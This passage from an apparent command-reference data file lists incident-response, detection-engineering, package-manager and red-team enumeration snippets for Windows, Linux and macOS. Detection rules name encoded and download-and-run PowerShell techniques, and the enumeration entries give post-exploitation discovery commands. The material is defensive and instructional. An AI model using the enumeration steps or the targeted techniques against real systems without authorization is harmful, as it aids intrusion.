  ps:`Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 20 |
  Select-Object TimeCreated, @{n='Service';e={$_.Properties[0].Value}}, @{n='Image';e={$_.Properties[1].Value}}`,
  linux:`ls -lt /etc/systemd/system/*.service /lib/systemd/system/*.service 2>/dev/null | head`,
  mac:`ls -lt /Library/LaunchDaemons /Library/LaunchAgents ~/Library/LaunchAgents 2>/dev/null | head -20`
 }},
{id:"ir-logclear", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Log-clearing / tampering signs",
 desc:"Detect audit-log-cleared events (Windows 1102) or gaps/truncation in Unix auth logs.",
 danger:"Requires administrator / root.",
 team:"blue", tags:["incident-response","logs"], attack:["T1070.001"],
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} -MaxEvents 10 |
  Select-Object TimeCreated, @{n='ClearedBy';e={$_.Properties[1].Value}}`,
  linux:`ls -la /var/log/auth.log /var/log/secure /var/log/wtmp /var/log/btmp 2>/dev/null
echo "-- journal --"; journalctl --disk-usage 2>/dev/null`,
  mac:`ls -la /var/log/*.log /private/var/log/ 2>/dev/null | head`
 }},
{id:"ir-open-files", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Open files / handles of a process",
 desc:"What a suspect process has open. Windows needs Sysinternals handle.exe; lsof on mac/linux.",
 danger:"Run elevated.",
 team:"blue", tags:["incident-response","triage","process"],
 code:{
  ps:`# Sysinternals handle.exe (dependency):
handle.exe -p {{PID:1234}}`,
  linux:`sudo lsof -p {{PID:1234}}`,
  mac:`sudo lsof -p {{PID:1234}}`
 }},
{id:"ir-loaded-modules", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Loaded modules of a process",
 desc:"DLLs / shared libraries a process has loaded — helps spot injected or unusual modules.",
 danger:"Run elevated.",
 team:"blue", tags:["incident-response","triage","process"], attack:["T1055"],
 code:{
  ps:`Get-Process -Id {{PID:1234}} | Select-Object -ExpandProperty Modules | Select-Object ModuleName, FileName | Sort-Object ModuleName`,
  linux:`sudo cat /proc/{{PID:1234}}/maps | awk '{print $6}' | grep -E '[.]so' | sort -u`,
  mac:`sudo lsof -p {{PID:1234}} | grep -E 'dylib'`
 }},
{id:"ir-wmi-persistence", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"WMI event-subscription persistence",
 desc:"List permanent WMI event subscriptions — a stealthy Windows persistence mechanism.",
 danger:"Requires administrator.",
 team:"blue", tags:["incident-response","persistence"], attack:["T1546.003"],
 code:{
  ps:`Get-WmiObject -Namespace root/subscription -Class __EventFilter | Select-Object Name, Query
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Select-Object Name, CommandLineTemplate
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Select-Object Filter, Consumer`
 }},
{id:"ir-hosts-file", level:"intermediate", cat:"Incident Response & Live Triage", title:"Inspect the hosts file",
 desc:"Check for malicious static DNS overrides in the hosts file.",
 team:"blue", tags:["incident-response","network","quick-win"],
 code:{
  ps:`Get-Content C:/Windows/System32/drivers/etc/hosts | Where-Object { $_.Trim() -and -not $_.Trim().StartsWith('#') }`,
  cmd:`type C:\\Windows\\System32\\drivers\\etc\\hosts | findstr /v "^#"`,
  linux:`grep -vE '^[[:space:]]*(#|$)' /etc/hosts`,
  mac:`grep -vE '^[[:space:]]*(#|$)' /etc/hosts`
 }},
{id:"ir-scheduled-recent", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Recently created scheduled tasks",
 desc:"Scheduled tasks / cron / timers by most-recent write — catches freshly planted persistence.",
 danger:"Run elevated.",
 team:"blue", tags:["incident-response","persistence","scheduling"], attack:["T1053.005"],
 code:{
  ps:`Get-ChildItem C:/Windows/System32/Tasks -Recurse -File -ErrorAction SilentlyContinue |
  Sort-Object LastWriteTime -Descending | Select-Object -First 15 FullName, LastWriteTime`,
  linux:`ls -lt /etc/cron.d /var/spool/cron/crontabs /etc/systemd/system/*.timer 2>/dev/null | head -20`,
  mac:`ls -lt /Library/LaunchDaemons ~/Library/LaunchAgents 2>/dev/null | head; crontab -l 2>/dev/null`
 }},
{id:"ir-pcap", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Quick packet capture",
 desc:"Capture traffic for a host to a file for later analysis. tcpdump (mac/linux); netsh trace (Windows).",
 danger:"Captures traffic to a file; run elevated. Authorized monitoring only.",
 team:"blue", tags:["incident-response","network"],
 code:{
  ps:`netsh trace start capture=yes tracefile=C:/capture.etl
Write-Host "Reproduce the activity, then: netsh trace stop"`,
  linux:`sudo tcpdump -i {{IFACE:eth0}} -w "capture_$(date +%H%M%S).pcap" host {{IP:10.0.0.5}}`,
  mac:`sudo tcpdump -i {{IFACE:en0}} -w "capture_$(date +%H%M%S).pcap" host {{IP:10.0.0.5}}`
 }},
{id:"ir-memory-acquire", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Acquire RAM",
 desc:"Dump physical memory for offline analysis. Needs a trusted forensic build (WinPmem / AVML / OSXPmem).",
 danger:"Needs admin/root; writes a very large file. Use a trusted, verified acquisition binary.",
 team:"blue", tags:["incident-response","memory","forensics"],
 code:{
  ps:`# WinPmem (Velocidex) — download the signed binary first:
./winpmem.exe -o C:/mem.raw`,
  linux:`sudo avml /tmp/mem.lime      # Microsoft AVML`,
  mac:`sudo osxpmem.app/osxpmem -o /tmp/mem.aff4`
 }},
{id:"ir-isolate-host", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Network isolation (containment)",
 desc:"Cut a host off the network except a management subnet, to contain an active compromise.",
 danger:"CONTAINMENT — will drop the host's network (you may lose your own remote session). Authorized IR only; run elevated.",
 team:"blue", tags:["incident-response","containment","network"],
 code:{
  ps:`New-NetFirewallRule -DisplayName "IR-Block-Out" -Direction Outbound -Action Block -RemoteAddress Any
New-NetFirewallRule -DisplayName "IR-Allow-Mgmt" -Direction Outbound -Action Allow -RemoteAddress {{MGMT:10.0.0.0/24}}`,
  linux:`sudo nft add table inet ir 2>/dev/null
sudo nft 'add chain inet ir out { type filter hook output priority 0; policy drop; }'
sudo nft add rule inet ir out ip daddr {{MGMT:10.0.0.0/24}} accept`,
  mac:`printf 'block all\\npass out to {{MGMT:10.0.0.0/24}}\\n' | sudo pfctl -ef -`
 }},
{id:"ir-kill-by-conn", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Kill processes talking to an IP",
 desc:"Find and terminate the process(es) with a connection to a suspect address.",
 danger:"Force-terminates processes — unsaved data is lost. Confirm before running; needs elevation.",
 team:"blue", tags:["incident-response","containment","process"],
 code:{
  ps:`$ip="{{IP:203.0.113.10}}"
Get-NetTCPConnection -RemoteAddress $ip | Select-Object -Expand OwningProcess -Unique |
  ForEach-Object { Get-Process -Id $_ | Select-Object Name, Id; Stop-Process -Id $_ -Force }`,
  linux:`IP={{IP:203.0.113.10}}
sudo ss -tunp | grep "$IP"   # note the pid=NNNN, then: sudo kill -9 <PID>`,
  mac:`IP={{IP:203.0.113.10}}
sudo lsof -nP -iTCP | grep "$IP"   # note the PID, then: sudo kill -9 <PID>`
 }},
{id:"ir-timeline", level:"intermediate", cat:"Incident Response & Live Triage", title:"File MACB timeline",
 desc:"List files under a path sorted by time to reconstruct activity around an incident.",
 team:"blue", tags:["incident-response","forensics","timeline"],
 code:{
  ps:`Get-ChildItem {{PATH:C:/inetpub}} -Recurse -File -ErrorAction SilentlyContinue |
  Sort-Object LastWriteTime | Select-Object LastWriteTime, CreationTime, FullName`,
  linux:`find {{PATH:/var/www}} -type f -printf '%TY-%Tm-%Td %TH:%TM  %p\\n' 2>/dev/null | sort`,
  mac:`find {{PATH:/var/www}} -type f -exec stat -f '%Sm %N' {} + 2>/dev/null | sort`
 }},
{id:"ir-clipboard", level:"intermediate", cat:"Incident Response & Live Triage", title:"Capture the clipboard",
 desc:"Grab current clipboard contents — a volatile artifact worth collecting early.",
 team:"blue", tags:["incident-response","triage","quick-win"],
 code:{
  ps:`Get-Clipboard`,
  mac:`pbpaste`,
  linux:`xclip -selection clipboard -o 2>/dev/null || wl-paste 2>/dev/null`
 }},

/* ================= DETECTION ENGINEERING ================= */
{id:"det-yara-scan", level:"intermediate", cat:"Detection Engineering", title:"YARA: scan a path with a ruleset",
 desc:"Recursively scan files for matches against a YARA ruleset. Requires yara.",
 team:"blue", tags:["detection","yara","forensics"],
 code:{
  linux:`yara -r {{RULE:/opt/rules/malware.yar}} {{PATH:/home}}`,
  mac:`yara -r {{RULE:/opt/rules/malware.yar}} {{PATH:/Users}}`
 }},
{id:"det-yara-rule", level:"intermediate", cat:"Detection Engineering", title:"YARA: write & run a rule",
 desc:"Author a minimal YARA rule (PE header + suspicious strings) and scan with it.",
 team:"blue", tags:["detection","yara"],
 code:{
  linux:`cat > sample.yar <<'EOF'
rule suspicious_dropper
{
  strings:
    $mz = { 4D 5A }                 // PE 'MZ' header
    $s1 = "cmd.exe /c" ascii nocase
    $s2 = "powershell -enc" ascii nocase
  condition:
    $mz at 0 and any of ($s*)
}
EOF
yara -r sample.yar {{PATH:/tmp}}`,
  mac:`cat > sample.yar <<'EOF'
rule suspicious_dropper
{
  strings:
    $mz = { 4D 5A }
    $s1 = "cmd.exe /c" ascii nocase
    $s2 = "powershell -enc" ascii nocase
  condition:
    $mz at 0 and any of ($s*)
}
EOF
yara -r sample.yar {{PATH:/tmp}}`
 }},
{id:"det-yara-proc", level:"intermediate",requires:{"elevation":true}, cat:"Detection Engineering", title:"YARA: scan process memory",
 desc:"Scan a running process's memory against a ruleset (Linux). Requires yara + root.",
 danger:"Run elevated.",
 team:"blue", tags:["detection","yara","memory"], attack:["T1055"],
 code:{
  linux:`sudo yara {{RULE:/opt/rules/malware.yar}} /proc/{{PID:1234}}/mem 2>/dev/null   # or: yara -p {{PID:1234}} rule.yar`
 }},
{id:"det-sigma-rule", level:"intermediate", cat:"Detection Engineering", title:"Sigma: a portable detection rule",
 desc:"A Sigma rule (backend-agnostic YAML) — example: encoded PowerShell process creation.",
 team:"blue", tags:["detection","sigma","logs"], attack:["T1059.001"],
 code:{
  linux:`cat > enc_powershell.yml <<'EOF'
title: Encoded PowerShell Command
logsource:
  product: windows
  category: process_creation
detection:
  sel:
    Image|endswith: '\\powershell.exe'
    CommandLine|contains:
      - ' -enc '
      - ' -EncodedCommand '
  condition: sel
level: high
EOF
echo "Convert it to your SIEM with sigma-cli (see the next entry)."`
 }},
{id:"det-sigma-convert", level:"intermediate", cat:"Detection Engineering", title:"Sigma: convert to a SIEM query",
 desc:"Translate a Sigma rule into your platform's query language. Requires sigma-cli (pip install sigma-cli).",
 team:"blue", tags:["detection","sigma"],
 code:{
  linux:`sigma convert -t splunk {{RULE:enc_powershell.yml}}   # backends: splunk, esql, lucene, ...`,
  mac:`sigma convert -t splunk {{RULE:enc_powershell.yml}}`
 }},
{id:"det-suricata-rule", level:"intermediate", cat:"Detection Engineering", title:"Suricata: write & test a signature",
 desc:"Author a Suricata/Snort rule and run it against a pcap. Requires suricata.",
 team:"blue", tags:["detection","suricata","network"],
 code:{
  linux:`cat > local.rules <<'EOF'
alert http $HOME_NET any -> any any (msg:"Cleartext login POST"; flow:to_server; http.method; content:"POST"; http.uri; content:"/login"; sid:1000001; rev:1;)
EOF
suricata -r {{PCAP:traffic.pcap}} -S local.rules -l .
cat fast.log`
 }},
{id:"det-suricata-run", level:"intermediate", cat:"Detection Engineering", title:"Suricata: run against a pcap",
 desc:"Replay a capture through an existing ruleset and read the alerts. Requires suricata.",
 team:"blue", tags:["detection","suricata","network"],
 code:{
  linux:`suricata -r {{PCAP:traffic.pcap}} -S {{RULES:/etc/suricata/rules/suricata.rules}} -l .
tail -n 40 fast.log`
 }},
{id:"det-suricata-update", level:"intermediate",requires:{"elevation":true}, cat:"Detection Engineering", title:"Suricata: update ET rules",
 desc:"Fetch/refresh Emerging Threats rules. Requires suricata-update.",
 danger:"Writes rule files; run with appropriate privileges.",
 team:"blue", tags:["detection","suricata"],
 code:{
  linux:`sudo suricata-update && sudo suricatasc -c reload-rules 2>/dev/null`
 }},
{id:"det-suricata-eve", level:"intermediate", cat:"Detection Engineering", title:"Suricata: summarize eve.json alerts",
 desc:"Roll up alert signatures and talkers from Suricata's eve.json. Requires jq.",
 team:"blue", tags:["detection","suricata","logs"],
 code:{
  linux:`jq -r 'select(.event_type=="alert") | "\\(.alert.signature)  \\(.src_ip) -> \\(.dest_ip)"' eve.json | sort | uniq -c | sort -rn | head`
 }},
{id:"det-zeek-pcap", level:"intermediate", cat:"Detection Engineering", title:"Zeek: analyze a pcap",
 desc:"Generate Zeek logs from a capture and summarize connections. Requires zeek.",
 team:"blue", tags:["detection","zeek","network"],
 code:{
  linux:`zeek -r {{PCAP:traffic.pcap}}
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service | sort | uniq -c | sort -rn | head`,
  mac:`zeek -r {{PCAP:traffic.pcap}}
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service | sort | uniq -c | sort -rn | head`
 }},
{id:"det-zeek-live", level:"intermediate",requires:{"elevation":true}, cat:"Detection Engineering", title:"Zeek: run live on an interface",
 desc:"Continuously produce Zeek logs from live traffic. Requires zeek + root.",
 danger:"Captures traffic; run elevated. Authorized monitoring only.",
 team:"blue", tags:["detection","zeek","network"],
 code:{
  linux:`sudo zeek -i {{IFACE:eth0}} -C`
 }},
{id:"det-zeek-iocs", level:"intermediate", cat:"Detection Engineering", title:"Zeek: extract DNS / HTTP IOCs",
 desc:"Pull the top DNS queries and HTTP hosts from Zeek logs for review (zeek-cut).",
 team:"blue", tags:["detection","zeek","dns"],
 code:{
  linux:`echo "== DNS =="; zeek-cut query < dns.log | sort | uniq -c | sort -rn | head
echo "== HTTP hosts =="; zeek-cut host < http.log | sort | uniq -c | sort -rn | head`,
  mac:`echo "== DNS =="; zeek-cut query < dns.log | sort | uniq -c | sort -rn | head
echo "== HTTP hosts =="; zeek-cut host < http.log | sort | uniq -c | sort -rn | head`
 }},
{id:"det-osquery-run", level:"intermediate", cat:"Detection Engineering", title:"osquery: ad-hoc query",
 desc:"Query the endpoint as a SQL database. Requires osquery (osqueryi). Cross-platform.",
 team:"blue", tags:["detection","osquery"],
 code:{
  ps:`osqueryi "SELECT hostname, cpu_brand, physical_memory FROM system_info;"`,
  linux:`osqueryi "SELECT hostname, cpu_brand, physical_memory FROM system_info;"`,
  mac:`osqueryi "SELECT hostname, cpu_brand, physical_memory FROM system_info;"`
 }},
{id:"det-osquery-deleted-bin", level:"intermediate", cat:"Detection Engineering", title:"osquery: processes with no on-disk binary",
 desc:"Running processes whose executable was deleted — a fileless / dropped-payload indicator.",
 team:"blue", tags:["detection","osquery","process"], attack:["T1620"],
 code:{
  ps:`osqueryi "SELECT pid, name, path FROM processes WHERE on_disk = 0;"`,
  linux:`osqueryi "SELECT pid, name, path FROM processes WHERE on_disk = 0;"`,
  mac:`osqueryi "SELECT pid, name, path FROM processes WHERE on_disk = 0;"`
 }},
{id:"det-osquery-listening", level:"intermediate", cat:"Detection Engineering", title:"osquery: listening ports + process",
 desc:"Join listening sockets to their owning process via osquery.",
 team:"blue", tags:["detection","osquery","network"],
 code:{
  ps:`osqueryi "SELECT p.pid, p.name, l.address, l.port FROM listening_ports l JOIN processes p ON l.pid = p.pid;"`,
  linux:`osqueryi "SELECT p.pid, p.name, l.address, l.port FROM listening_ports l JOIN processes p ON l.pid = p.pid;"`,
  mac:`osqueryi "SELECT p.pid, p.name, l.address, l.port FROM listening_ports l JOIN processes p ON l.pid = p.pid;"`
 }},
{id:"det-osquery-autostart", level:"intermediate", cat:"Detection Engineering", title:"osquery: autostart / persistence",
 desc:"Enumerate persistence points via osquery (startup items, scheduled tasks, crontab).",
 team:"blue", tags:["detection","osquery","persistence"], attack:["T1547"],
 code:{
  ps:`osqueryi "SELECT name, path, source FROM startup_items;"
osqueryi "SELECT name, action, path FROM scheduled_tasks;"`,
  linux:`osqueryi "SELECT command, path, minute, hour FROM crontab;"`,
  mac:`osqueryi "SELECT name, path, source FROM startup_items;"`
 }},
{id:"det-osquery-fim", level:"intermediate", cat:"Detection Engineering", title:"osquery: file hashes (integrity)",
 desc:"Hash sensitive files with osquery for integrity monitoring / baselining.",
 team:"blue", tags:["detection","osquery","forensics"],
 code:{
  linux:`osqueryi "SELECT path, sha256 FROM hash WHERE path IN ('/etc/passwd','/etc/hosts','/etc/ssh/sshd_config');"`,
  mac:`osqueryi "SELECT path, sha256 FROM hash WHERE path IN ('/etc/passwd','/etc/hosts','/etc/ssh/sshd_config');"`
 }},
{id:"det-sysmon-install", level:"intermediate",requires:{"elevation":true}, cat:"Detection Engineering", title:"Sysmon: deploy with a config",
 desc:"Install Sysmon for rich process/network/registry telemetry. Sysmon (Sysinternals) + a curated config (e.g. SwiftOnSecurity or olafhartong).",
 danger:"Installs a kernel driver; run elevated. Test the config before wide deployment.",
 team:"blue", tags:["detection","sysmon","logs"],
 code:{
  ps:`./Sysmon64.exe -accepteula -i {{CONFIG:sysmonconfig.xml}}
# update the config later without reinstalling:
./Sysmon64.exe -c {{CONFIG:sysmonconfig.xml}}`
 }},
{id:"det-sysmon-query", level:"intermediate",requires:{"elevation":true}, cat:"Detection Engineering", title:"Sysmon: query high-value events",
 desc:"Pull recent Sysmon events by ID. Key IDs: 1 proc, 3 net, 7 image-load, 8 remote-thread, 11 file-create, 13 reg-set, 22 DNS.",
 danger:"Requires administrator; Sysmon must be installed.",
 team:"blue", tags:["detection","sysmon","logs"], attack:["T1059"],
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id={{ID:1}}} -MaxEvents 20 |
  Select-Object TimeCreated, Message`
 }},
{id:"det-4688-cmdline", level:"intermediate",requires:{"elevation":true}, cat:"Detection Engineering", title:"Windows: process creation w/ command line (4688)",
 desc:"Enable command-line auditing, then hunt process-creation events. Native.",
 danger:"Enabling audit policy requires administrator.",
 team:"blue", tags:["detection","logs","process"], attack:["T1059"],
 code:{
  ps:`# one-time enable: auditpol /set /subcategory:"Process Creation" /success:enable
#   plus 'Include command line in process creation events' (GPO/registry)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 20 |
  Select-Object TimeCreated, @{n='NewProcess';e={$_.Properties[5].Value}}, @{n='CommandLine';e={$_.Properties[8].Value}}`
 }},
{id:"det-powershell-scriptblock", level:"intermediate",requires:{"elevation":true}, cat:"Detection Engineering", title:"Windows: PowerShell script-block hunt (4104)",
 desc:"Search PowerShell Operational logs for encoded/obfuscated script blocks. Script-block logging must be on.",
 danger:"Requires administrator.",
 team:"blue", tags:["detection","logs"], attack:["T1059.001"],
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 50 |
  Where-Object { $_.Message -match 'FromBase64String|-enc|IEX|DownloadString|Invoke-Expression' } |
  Select-Object TimeCreated, Message`
 }},
{id:"det-auditd-rule", level:"intermediate",requires:{"elevation":true}, cat:"Detection Engineering", title:"Linux: auditd watch",
 desc:"Add auditd rules to watch a sensitive file and log every execve. Requires auditd.",
 danger:"Modifies audit configuration; run elevated.",
 team:"blue", tags:["detection","logs","linux"], attack:["T1053"],
 code:{
  linux:`sudo auditctl -w /etc/passwd -p wa -k passwd_changes
sudo auditctl -a always,exit -F arch=b64 -S execve -k exec_log
sudo ausearch -k exec_log | tail`
 }},

/* ================= PACKAGE MANAGERS ================= */
{id:"pkg-search", level:"beginner", cat:"Package Managers", title:"Search for a package",
 desc:"Find a package by name/keyword. Windows: winget/choco; macOS: brew; Linux: apt/dnf/pacman.",
 tags:["package-manager"],
 code:{
  ps:`winget search {{NAME:7zip}}`,
  cmd:`choco search {{NAME:7zip}}`,
  mac:`brew search {{NAME:wget}}`,
  linux:`apt-cache search {{NAME:wget}}   # dnf: dnf search {{NAME:wget}}   pacman: pacman -Ss {{NAME:wget}}`
 }},
{id:"pkg-install", level:"beginner",requires:{"elevation":true}, cat:"Package Managers", title:"Install a package",
 desc:"Install a package from the default repositories.",
 danger:"Installs software; needs admin/root.",
 tags:["package-manager"],
 code:{
  ps:`winget install {{NAME:Git.Git}}`,
  cmd:`choco install {{NAME:git}} -y`,
  mac:`brew install {{NAME:git}}`,
  linux:`sudo apt install {{NAME:git}}   # dnf: sudo dnf install {{NAME:git}}   pacman: sudo pacman -S {{NAME:git}}`
 }},
{id:"pkg-remove", level:"beginner",requires:{"elevation":true}, cat:"Package Managers", title:"Uninstall a package",
 desc:"Remove an installed package.",
 danger:"Removes software; needs admin/root.",
 tags:["package-manager"],
 code:{
  ps:`winget uninstall {{NAME:Git.Git}}`,
  cmd:`choco uninstall {{NAME:git}} -y`,
  mac:`brew uninstall {{NAME:git}}`,
  linux:`sudo apt remove {{NAME:git}}   # dnf: sudo dnf remove {{NAME:git}}   pacman: sudo pacman -R {{NAME:git}}`
 }},
{id:"pkg-upgrade-all", level:"beginner",requires:{"elevation":true}, cat:"Package Managers", title:"Upgrade everything",
 desc:"Update repository metadata and upgrade all installed packages.",
 danger:"Upgrades installed software and may restart services. Needs admin/root.",
 tags:["package-manager"],
 code:{
  ps:`winget upgrade --all`,
  cmd:`choco upgrade all -y`,
  mac:`brew update && brew upgrade`,
  linux:`sudo apt update && sudo apt upgrade -y   # dnf: sudo dnf upgrade   pacman: sudo pacman -Syu`
 }},
{id:"pkg-list", level:"beginner", cat:"Package Managers", title:"List installed packages",
 desc:"Enumerate installed packages and versions.",
 tags:["package-manager"],
 code:{
  ps:`winget list`,
  cmd:`choco list --local-only`,
  mac:`brew list --versions`,
  linux:`apt list --installed 2>/dev/null   # dnf: dnf list installed   pacman: pacman -Q`
 }},
{id:"pkg-info", level:"beginner", cat:"Package Managers", title:"Show package details",
 desc:"Version, dependencies, and description for a package.",
 tags:["package-manager"],
 code:{
  ps:`winget show {{NAME:Git.Git}}`,
  mac:`brew info {{NAME:git}}`,
  linux:`apt show {{NAME:git}}   # dnf: dnf info {{NAME:git}}   pacman: pacman -Si {{NAME:git}}`
 }},
{id:"pkg-outdated", level:"beginner", cat:"Package Managers", title:"List upgradable packages",
 desc:"Show which installed packages have newer versions available.",
 tags:["package-manager"],
 code:{
  ps:`winget upgrade`,
  mac:`brew outdated`,
  linux:`apt list --upgradable 2>/dev/null   # dnf: dnf check-update   pacman: pacman -Qu`
 }},
{id:"pkg-clean", level:"beginner",requires:{"elevation":true}, cat:"Package Managers", title:"Clean package caches",
 desc:"Reclaim disk space by removing cached downloads/old versions.",
 danger:"Deletes cached package files.",
 tags:["package-manager"],
 code:{
  mac:`brew cleanup`,
  linux:`sudo apt clean && sudo apt autoclean   # dnf: sudo dnf clean all`
 }},
{id:"pkg-autoremove", level:"beginner",requires:{"elevation":true}, cat:"Package Managers", title:"Remove orphaned dependencies",
 desc:"Remove packages that were installed as dependencies and are no longer needed.",
 danger:"Removes packages; review the list before confirming.",
 tags:["package-manager"],
 code:{
  mac:`brew autoremove`,
  linux:`sudo apt autoremove   # dnf: sudo dnf autoremove   pacman: pacman -Qdtq | sudo pacman -Rns -`
 }},
{id:"pkg-owns-file", level:"beginner", cat:"Package Managers", title:"Which package owns a file",
 desc:"Map a file on disk back to the package that installed it (Linux).",
 tags:["package-manager","linux"],
 code:{
  linux:`dpkg -S {{FILE:/usr/bin/ssh}}   # rpm: rpm -qf {{FILE:/usr/bin/ssh}}`
 }},
{id:"pkg-files", level:"beginner", cat:"Package Managers", title:"List a package's files",
 desc:"Show every file a package placed on disk.",
 tags:["package-manager"],
 code:{
  mac:`brew list {{NAME:git}}`,
  linux:`dpkg -L {{NAME:openssh-client}}   # rpm: rpm -ql {{NAME:openssh}}`
 }},
{id:"pkg-hold", level:"beginner",requires:{"elevation":true}, cat:"Package Managers", title:"Pin / hold a package version",
 desc:"Prevent a package from being upgraded.",
 danger:"Blocks security updates for the held package until you unhold it.",
 tags:["package-manager"],
 code:{
  ps:`winget pin add {{NAME:Git.Git}}   # remove: winget pin remove {{NAME:Git.Git}}`,
  mac:`brew pin {{NAME:node}}   # unpin: brew unpin {{NAME:node}}`,
  linux:`sudo apt-mark hold {{NAME:nginx}}   # unhold: sudo apt-mark unhold {{NAME:nginx}} ; dnf: dnf versionlock add`
 }},
{id:"pkg-verify", level:"beginner",requires:{"elevation":true}, cat:"Package Managers", title:"Verify installed package integrity",
 desc:"Check installed files against the package database for tampering/corruption (Linux).",
 danger:"Requires elevation to read all package files.",
 tags:["package-manager","linux","detection"],
 code:{
  linux:`sudo debsums -c 2>/dev/null   # RPM: rpm -Va | head`
 }},
{id:"pkg-history", level:"beginner", cat:"Package Managers", title:"Recent install / upgrade history",
 desc:"Review recent package changes on the system.",
 tags:["package-manager"],
 code:{
  linux:`grep -E ' install | upgrade | remove ' /var/log/dpkg.log 2>/dev/null | tail -20   # dnf: dnf history`,
  mac:`ls -lt "$(brew --cellar)" 2>/dev/null | head   # Homebrew keeps no global log`
 }},
{id:"pkg-download", level:"beginner", cat:"Package Managers", title:"Download a package without installing",
 desc:"Fetch a package (and optionally its deps) for offline use or inspection.",
 tags:["package-manager"],
 code:{
  mac:`brew fetch {{NAME:git}}`,
  linux:`apt download {{NAME:git}}   # with deps: sudo apt install --download-only {{NAME:git}}`
 }},
{id:"pkg-winget-export", level:"beginner", cat:"Package Managers", title:"Export / import installed list (Windows)",
 desc:"Snapshot installed winget packages to a file and replay on another machine.",
 tags:["package-manager","windows","automation"],
 code:{
  ps:`winget export -o packages.json
# on a new machine: winget import -i packages.json`
 }},
{id:"pkg-scoop", level:"beginner", cat:"Package Managers", title:"Scoop (user-scope, Windows)",
 desc:"Scoop installs Windows CLI tools without admin. Requires scoop (scoop.sh).",
 tags:["package-manager","windows"],
 code:{
  ps:`scoop install {{NAME:ripgrep}}   # search: scoop search {{NAME:ripgrep}} ; update all: scoop update *`
 }},
{id:"pkg-pip", level:"beginner", cat:"Package Managers", title:"pip: install / list Python packages",
 desc:"Manage Python packages with pip. Prefer a virtual environment over system-wide installs.",
 tags:["package-manager"],
 code:{
  ps:`python -m pip install {{PKG:requests}}
python -m pip list`,
  mac:`python3 -m pip install {{PKG:requests}}
python3 -m pip list`,
  linux:`python3 -m pip install {{PKG:requests}}
python3 -m pip list`
 }},
{id:"pkg-pip-outdated", level:"beginner", cat:"Package Managers", title:"pip: list outdated packages",
 desc:"Show installed Python packages that have newer versions.",
 tags:["package-manager"],
 code:{
  ps:`python -m pip list --outdated`,
  mac:`python3 -m pip list --outdated`,
  linux:`python3 -m pip list --outdated`
 }},
{id:"pkg-npm-global", level:"beginner",requires:{"elevation":true}, cat:"Package Managers", title:"npm: global packages",
 desc:"Install, list, and check global Node packages. Requires node/npm.",
 tags:["package-manager"],
 code:{
  ps:`npm install -g {{PKG:npm}}   # list: npm list -g --depth=0 ; outdated: npm outdated -g`,
  mac:`npm install -g {{PKG:npm}}   # list: npm list -g --depth=0 ; outdated: npm outdated -g`,
  linux:`sudo npm install -g {{PKG:npm}}   # list: npm list -g --depth=0`
 }},

/* ================= ENUMERATION ================= */
{id:"enum-whoami-priv", level:"intermediate",requires:{"elevation":true},updated:"2026-07", cat:"Enumeration", title:"Current user, groups & privileges",
 desc:"First situational-awareness step after access: who am I, my groups, and my rights.",
 danger:"Post-exploitation enumeration — authorized engagements only.",
 team:"red", tags:["enumeration","account"], attack:["T1033"],
 detect:"Discovery binaries (whoami/id) are low-signal alone; EDR flags them inside rapid discovery bursts; Sysmon 1 / 4688.",
 mitigate:"Least privilege limits what enumeration reveals; EDR discovery analytics.",
 code:{
  ps:`whoami /all`,
  cmd:`whoami /priv`,
  mac:`id; groups`,
  linux:`id; sudo -n true 2>/dev/null && echo "passwordless sudo available"`
 }},
{id:"enum-system-info", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"OS build & patch level",
 desc:"OS version, build, and architecture for exploit/privilege matching.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration"], attack:["T1082"],
 detect:"systeminfo/uname execution; correlated discovery activity in EDR.",
 mitigate:"Patch promptly so version disclosure yields no usable exploit; EDR analytics.",
 code:{
  ps:`systeminfo`,
  mac:`sw_vers; uname -a`,
  linux:`uname -a; cat /etc/os-release 2>/dev/null; hostnamectl 2>/dev/null`
 }},
{id:"enum-network-local", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"Local network view",
 desc:"Interfaces, routes, ARP neighbors, and active connections from the host's perspective.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","network"], attack:["T1016"],
 detect:"ipconfig/route/arp/netstat sequence; EDR discovery correlation.",
 mitigate:"Segmentation limits what neighbors reveal; monitor discovery sequences.",
 code:{
  ps:`ipconfig /all; route print; arp -a; netstat -ano`,
  mac:`ifconfig; netstat -rn; arp -an; netstat -an`,
  linux:`ip a; ip route; ip neigh; ss -tunap`
 }},
{id:"enum-processes", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"Processes & owners",
 desc:"Running processes with owners — spot AV/EDR, interesting services, and credential-bearing apps.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","process"], attack:["T1057"],
 detect:"Process listing is low-signal; suspicious when paired with credential access.",
 mitigate:"EDR; restrict tooling; least privilege.",
 code:{
  ps:`Get-Process -IncludeUserName | Sort-Object CPU -Descending | Select-Object -First 30`,
  mac:`ps auxww`,
  linux:`ps auxww`
 }},
{id:"enum-installed-software", level:"intermediate",updated:"2026-07", cat:"Enumeration", title:"Installed software & versions",
 desc:"Enumerate installed applications for vulnerable-version matching.",
